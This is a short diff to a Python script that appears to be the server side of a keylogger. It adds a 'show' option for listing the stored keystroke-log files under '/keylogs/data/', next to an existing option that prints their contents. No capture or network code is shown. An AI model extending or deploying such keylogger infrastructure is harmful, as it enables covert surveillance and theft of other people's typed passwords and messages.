@@ -84,8 +84,6 @@ if __name__ == '__main__':
     if argument.readfile:
         path = '/keylogs/data/'
         fics = glob.glob(os.path.join(path, '*'))
-        #client_address = server_socket.getpeername()
-        #ficname = f"{client_address[0]}-{datetime.date.today()}.txt"
         for fic in fics:
             print("------------------")
             print(fic)
@@ -94,6 +92,16 @@ if __name__ == '__main__':
                 d = f.read()
                 print(d)
                 print("------------------")
+    if argument.show and not argument.readfile:
+        path = '/keylogs/data/'
+        fics = glob.glob(os.path.join(path, '*'))
+        for fic in fics:
+            print("------------------")
+            print(fic)
+            print("------------------")
+
+
+
     else :
 
         if argument.listen:
